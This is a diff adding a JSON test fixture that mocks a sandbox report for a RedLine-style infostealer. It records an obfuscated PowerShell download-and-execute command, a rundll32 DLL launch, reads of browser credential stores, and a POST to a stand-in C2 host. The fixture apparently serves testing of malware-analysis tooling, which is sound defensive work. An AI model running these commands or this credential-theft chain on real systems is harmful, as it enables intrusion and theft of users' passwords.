@@ -1,0 +1,123 @@
+{
+  "fixture_version": "1.0",
+  "metadata": {
+    "sample_name": "invoice_scanner.exe",
+    "threat_name": "Spyware.Win32.RedLine.Mock",
+    "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
+    "family": "RedLineStealer",
+    "environment": {
+      "os": "Windows 11 Enterprise 64-bit Build 22631",
+      "sandbox_type": "ReplaySandbox",
+      "duration_seconds": 90
+    }
+  },
+  "processes": [
+    {
+      "pid": 2450,
+      "ppid": 1100,
+      "name": "invoice_scanner.exe",
+      "command_line": "\"C:\\Users\\Victim\\Downloads\\invoice_scanner.exe\"",
+      "start_time": "2026-11-08T14:10:00Z",
+      "end_time": "2026-11-08T14:11:15Z"
+    },
+    {
+      "pid": 3120,
+      "ppid": 2450,
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==",
+      "start_time": "2026-11-08T14:10:04Z",
+      "end_time": "2026-11-08T14:10:20Z"
+    },
+    {
+      "pid": 4892,
+      "ppid": 3120,
+      "name": "rundll32.exe",
+      "command_line": "rundll32.exe C:\\Users\\Victim\\AppData\\Local\\Temp\\helper.dll,DllRegisterServer",
+      "start_time": "2026-11-08T14:10:18Z",
+      "end_time": "2026-11-08T14:11:10Z"
+    }
+  ],
+  "filesystem": [
+    {
+      "action": "write",
+      "pid": 3120,
+      "process_name": "powershell.exe",
+      "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\helper.dll",
+      "timestamp": "2026-11-08T14:10:15Z",
+      "size_bytes": 184320,
+      "is_dropped_binary": true
+    },
+    {
+      "action": "read",
+      "pid": 4892,
+      "process_name": "rundll32.exe",
+      "path": "C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+      "timestamp": "2026-11-08T14:10:25Z",
+      "is_credential_target": true
+    },
+    {
+      "action": "read",
+      "pid": 4892,
+      "process_name": "rundll32.exe",
+      "path": "C:\\Users\\Victim\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\key4.db",
+      "timestamp": "2026-11-08T14:10:28Z",
+      "is_credential_target": true
+    }
+  ],
+  "registry": [
+    {
+      "action": "reg_query",
+      "pid": 4892,
+      "process_name": "rundll32.exe",
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
+      "value_name": "MachineGuid",
+      "timestamp": "2026-11-08T14:10:22Z"
+    }
+  ],
+  "network": {
+    "dns": [
+      {
+        "pid": 4892,
+        "process_name": "rundll32.exe",
+        "query": "c2-collector-node9.xyz",
+        "record_type": "A",
+        "response": "194.26.29.112",
+        "timestamp": "2026-11-08T14:10:30Z"
+      }
+    ],
+    "connections": [
+      {
+        "pid": 4892,
+        "process_name": "rundll32.exe",
+        "protocol": "TCP",
+        "dest_ip": "194.26.29.112",
+        "dest_port": 8080,
+        "timestamp": "2026-11-08T14:10:32Z"
+      }
+    ],
+    "http": [
+      {
+        "pid": 4892,
+        "process_name": "rundll32.exe",
+        "method": "POST",
+        "url": "http://c2-collector-node9.xyz:8080/gate.php",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "status_code": 200,
+        "payload_size": 34210,
+        "timestamp": "2026-11-08T14:10:35Z"
+      }
+    ]
+  },
+  "artifacts": [
+    {
+      "name": "network_traffic.pcap",
+      "type": "pcap",
+      "description": "Captured HTTP C2 exfiltration request"
+    },
+    {
+      "name": "strings_dump.txt",
+      "type": "memory_strings",
+      "description": "Extracted process memory strings containing token credentials"
+    }
+  ]
+}
